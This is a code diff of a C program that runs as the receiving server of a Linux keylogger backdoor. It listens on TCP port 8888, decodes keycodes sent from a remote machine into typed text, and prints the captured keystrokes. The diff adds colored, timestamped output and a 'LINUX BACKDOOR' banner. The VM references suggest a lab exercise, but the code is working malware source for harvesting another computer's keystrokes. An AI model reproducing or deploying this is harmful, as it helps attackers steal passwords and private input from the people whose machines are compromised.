@@ -9,17 +9,43 @@
 #define SERVER_PORT 8888
 #define BUFFER_SIZE 1024
 
+void printMessage(char *message, char* color, int omit_date)
+{
+    time_t current_time = time(NULL);
+    struct tm *local_time = localtime(&current_time);
+    char date_string[20];
+    strftime(date_string, sizeof(date_string), "%Y-%m-%d %H:%M:%S", local_time);
+
+    char default_color[] = "\033[0m";
+    // if there is no color, print the message without color
+    if (color == NULL) {
+        if (omit_date == 1) {
+            printf("%s\n", message);
+        } else {
+            printf("\033[0;30m[%s] %s%s\n", date_string, default_color, message);
+        }
+    }
+    else {
+        if (omit_date == 1)
+            printf("%s%s%s\n", color, message, default_color);
+        else
+            printf("\033[0;30m[%s] %s%s%s\n", date_string, color, message, default_color);
+    }
+}
+
 int main()
 {
     int sockfd;
     struct sockaddr_in server_addr;
     char buffer[BUFFER_SIZE];
 
+    printMessage("===== [LINUX BACKDOOR] =====", "\033[0;32m", 1);
+
     // Create socket
     sockfd = socket(AF_INET, SOCK_STREAM, 0);
     if (sockfd < 0)
     {
-        perror("Failed to create socket");
+        printMessage("Failed to create socket", "\033[0;31m", 1);
         exit(EXIT_FAILURE);
     }
 
@@ -32,18 +58,20 @@ int main()
     // Bind socket to the server address
     if (bind(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0)
     {
-        perror("Failed to bind socket");
+        printMessage("Please, close the other instance of the program on the VM", "\033[0;31m", 1);
         exit(EXIT_FAILURE);
     }
 
     // Listen for incoming connections
     if (listen(sockfd, 1) < 0)
     {
-        perror("Failed to listen for connections");
+        printMessage("You may need to run this program as root", "\033[0;31m", 1);
         exit(EXIT_FAILURE);
     }
 
-    printf("Receiver is listening on port %d\n", SERVER_PORT);
+    char listening_msg[128];
+    sprintf(listening_msg, "Listening on port %d", SERVER_PORT);
+    printMessage(listening_msg, "\033[0;33m", 1);
 
     while (1)
     {
@@ -56,11 +84,13 @@ int main()
         client_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &client_len);
         if (client_sockfd < 0)
         {
-            perror("Failed to accept connection");
+            printMessage("Failed to accept connection", "\033[0;31m", 1);
             exit(EXIT_FAILURE);
         }
 
-        printf("Received a connection from %s:%d\n", inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
+        char received_connection_msg[128];
+        sprintf(received_connection_msg, "Received a connection from %s:%d", inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
+        printMessage(received_connection_msg, "\033[0;33m", 1);
 
         // Receive data
         while ((size = recv(client_sockfd, buffer, BUFFER_SIZE, 0)) > 0)
@@ -79,35 +109,39 @@ int main()
             if (converted != NULL)
             {
                 // If enter pressed, print the received string
-                if (buffer[0] == 28)
-                {
-                    printf("%s\n", received_string);
-                    strcpy(received_string, "");
-                    string_length = 0;
-                }
-                else if (buffer[0] == 57)
+                // if (buffer[0] == 28)
+                // {
+                //     printMessage(received_string, NULL, 0);
+                //     strcpy(received_string, "");
+                //     string_length = 0;
+                // }
+                // else
+                if (buffer[0] == 57)
                 {
                     strncpy(received_string + string_length, " ", BUFFER_SIZE - string_length - 1);
-                    string_length ++;
+                    string_length++;
                     received_string[string_length] = '\0'; // Add null-terminating character
                 }
                 else if (strlen(converted) == 1)
                 {
                     // Copy the converted character(s) to the received_string buffer
                     strncpy(received_string + string_length, converted, BUFFER_SIZE - string_length - 1);
-                    string_length ++;
+                    string_length++;
                     received_string[string_length] = '\0'; // Add null-terminating character
                 }
                 else
                 {
                     if (strlen(received_string) > 0)
                     {
-                        printf("%s\n", received_string);
+                        printMessage(received_string, NULL, 0);
                         strcpy(received_string, "");
                         string_length = 0;
                     }
 
-                    printf("[%s]\n", converted);
+                    // Transform converted string to *%s* format
+                    char converted_string[BUFFER_SIZE];
+                    sprintf(converted_string, "*%s*", converted);
+                    printMessage(converted_string, "\033[0;34m", 0);
                 }
             }
 
